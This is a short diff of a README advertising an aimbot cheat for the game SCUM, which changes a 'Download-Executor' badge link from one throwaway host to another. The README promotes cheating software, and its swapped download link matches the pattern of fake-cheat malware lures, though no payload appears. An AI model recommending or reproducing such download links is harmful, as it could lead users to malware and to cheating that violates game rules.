@@ -2,7 +2,7 @@
 
 In SCUM, an aimbot is a tool designed to enhance a player's aiming capabilities by automatically aligning the crosshair with enemy targets. This technology ensures precise shots, giving players a competitive edge in fast-paced survival scenarios.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload8.bitbucket.io/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://SCUM-Aimbot-cowy.github.io/.github)
 ---
 
 ## 🛠️ Key Features
